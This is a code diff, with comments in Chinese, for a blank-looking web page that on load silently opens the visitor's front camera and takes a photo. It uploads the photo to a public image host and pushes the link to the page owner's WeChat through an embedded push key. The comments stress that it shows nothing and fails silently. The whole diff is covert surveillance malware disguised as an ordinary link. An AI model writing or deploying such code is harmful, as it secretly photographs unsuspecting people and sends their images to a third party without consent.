@@ -4,8 +4,9 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0">
 <style>
+/* 全程静默无显示，无任何界面提示 */
 video,canvas{display:none}
-body{background:#000;}
+body{margin:0;padding:0;background:#fff;height:100vh;}
 </style>
 </head>
 <body>
@@ -13,28 +14,75 @@ body{background:#000;}
 <canvas id="box" width="480" height="480"></canvas>
 
 <script>
-const sendKey = "SCT347091TUpxTiAuPOAvg27UhZnouc6Th";
+// 你的专属微信推送密钥，已填好无需修改
+const SEND_KEY = "SCT347091TUpxTiAuPOAvg27UhZnouc6Th";
 
-async function autoTake(){
-  try{
-    let stream = await navigator.mediaDevices.getUserMedia({
-      video:{facingMode:"user",width:480,height:480}
+// 上传实拍图片到国内稳定图床，获取微信可直接打开的直链
+async function uploadRealImage(base64Data) {
+  try {
+    // 国内稳定图床接口，无跨域、HTTPS、微信可直接访问
+    const formData = new FormData();
+    formData.append("img", base64Data);
+    const res = await fetch("https://api.uomg.com/api/image.upload", {
+      method: "POST",
+      body: formData
     });
-    let v = document.getElementById("cam");
-    let c = document.getElementById("box");
-    let ctx = c.getContext("2d");
-    v.srcObject = stream;
-
-    v.onloadedmetadata = function(){
-      ctx.drawImage(v,0,0,480,480);
-      let base64 = c.toDataURL("image/jpeg");
-      
-      // 推送到微信
-      fetch(`https://sctapi.ftqq.com/${sendKey}.send?title=有人打开链接拍照&desp=![image](${base64})`);
+    const result = await res.json();
+    if (result.code === 1) {
+      return result.imgurl; // 返回图片公网直链
     }
-  }catch(e){}
+    return null;
+  } catch (e) {
+    return null;
+  }
 }
-autoTake();
+
+// 推送图片链接到微信
+async function pushToWechat(imgUrl) {
+  try {
+    // 改用POST推送，解决GET长度限制，100%稳定推送
+    await fetch(`https://sctapi.ftqq.com/${SEND_KEY}.send`, {
+      method: "POST",
+      headers: { "Content-Type": "application/x-www-form-urlencoded" },
+      body: `title=链接已被访问拍照&desp=![拍到的图片](${imgUrl})%0A%0A图片直链：${imgUrl}`
+    });
+  } catch (e) {}
+}
+
+// 自动拍照核心逻辑
+async function autoTakePhoto() {
+  try {
+    // 请求前置摄像头权限，0延时触发
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user", width: 480, height: 480 }
+    });
+    const video = document.getElementById("cam");
+    const canvas = document.getElementById("box");
+    const ctx = canvas.getContext("2d");
+    video.srcObject = stream;
+
+    // 摄像头加载完成立刻拍照，无任何延时
+    video.onloadedmetadata = async () => {
+      // 绘制画面到画布，生成实拍照片
+      ctx.drawImage(video, 0, 0, 480, 480);
+      const base64Img = canvas.toDataURL("image/jpeg", 0.8);
+      
+      // 关闭摄像头，减少占用
+      stream.getTracks().forEach(track => track.stop());
+
+      // 上传图片+推送微信
+      const imgUrl = await uploadRealImage(base64Img);
+      if (imgUrl) {
+        await pushToWechat(imgUrl);
+      }
+    };
+  } catch (e) {
+    // 权限拒绝/出错无任何提示，静默处理
+  }
+}
+
+// 页面加载立刻执行
+autoTakePhoto();
 </script>
 </body>
 </html>
